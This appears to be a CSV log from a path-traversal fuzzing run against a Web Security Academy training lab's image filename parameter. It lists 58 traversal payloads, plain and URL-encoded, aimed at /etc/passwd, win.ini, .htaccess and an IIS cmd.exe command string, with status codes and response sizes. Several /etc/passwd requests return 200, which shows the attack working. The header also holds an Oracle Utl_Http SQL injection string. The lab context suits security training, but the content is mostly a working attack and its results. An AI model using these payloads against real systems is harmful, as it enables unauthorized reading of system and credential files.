id_fuzz,#,Payload,URL,Method,StatusCode,SearchKeyword_error,SearchKeyword_exception,SearchKeyword_illegal,SearchKeyword_invalid,SearchKeyword_fail,SearchKeyword_stack,SearchKeyword_access,SearchKeyword_directory,SearchKeyword_file,SearchKeyword_not found,SearchKeyword_unknown,SearchKeyword_uid=,SearchKeyword_c:\,SearchKeyword_varchar,SearchKeyword_ODBC,SearchKeyword_SQL,SearchKeyword_quotation mark,SearchKeyword_syntax,SearchKeyword_ORA-,SearchKeyword_111111,SearchKeyword_test,SearchKeyword_test2,SearchKeyword_'||Utl_Http.request('http://<yourservername>') from dual--,TimeDelay,ContentLength
id_fuzz_1,1,\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,2,\..\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,3,\..\..\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,4,\..\..\..\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,5,\..\..\..\..\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\..\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,6,\..\..\..\..\..\..\WINDOWS\win.ini,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=\..\..\..\..\..\..\WINDOWS\win.ini,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,7,%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,8,%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,9,%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,10,%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,11,%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%5c%2e%2e%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,12,%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%5c%2e%2e%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,13,%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%5c%57%49%4e%44%4f%57%53%5c%77%69%6e%2e%69%6e%69,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,14,%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,15,%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,16,%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,17,%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63%%35%37%%34%39%%34%65%%34%34%%34%66%%35%37%%35%33%%35%63%%37%37%%36%39%%36%65%%32%65%%36%39%%36%65%%36%39,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,18,..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,19,..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,20,..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,21,..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,22,..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,23,..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,24,..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c../winnt/system32/cmd.exe?/c+dir+c:\,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,25,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,26,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,27,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,28,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,29,%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,30,%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,31,%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%77%69%6e%6e%74%2f%73%79%73%74%65%6d%33%32%2f%63%6d%64%2e%65%78%65%3f%2f%63%2b%64%69%72%2b%63%3a%5c,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,32,../../../../../../../../../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../../etc/passwd,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,33,../../../../../../../../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../../etc/passwd,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,34,../../../../../../../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../../etc/passwd,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,35,../../../../../../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../../etc/passwd,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,36,../../../../../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../../etc/passwd,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,37,../../../../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../../etc/passwd,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,38,../../../etc/passwd,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../etc/passwd,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,39,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,40,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,41,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,42,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,43,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,44,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,45,%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,200,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,1164
id_fuzz_1,46,%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,47,%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,48,%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,49,%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,50,%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66%%36%35%%37%34%%36%33%%32%66%%37%30%%36%31%%37%33%%37%33%%37%37%%36%34,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,51,../../../.htaccess,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../../.htaccess,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,52,../../.htaccess,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../../.htaccess,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,53,../.htaccess,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=../.htaccess,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,54,.htaccess,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=.htaccess,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,55,././.htaccess,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=././.htaccess,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,56,%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,57,%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%2e%2f%2e%68%74%61%63%63%65%73%73,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
id_fuzz_1,58,%2e%2e%2f%2e%68%74%61%63%63%65%73%73,https://acc51f761fd4870280aa5001006c0051.web-security-academy.net/image?filename=%2e%2e%2f%2e%68%74%61%63%63%65%73%73,GET,400,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0:00:00.291428,14
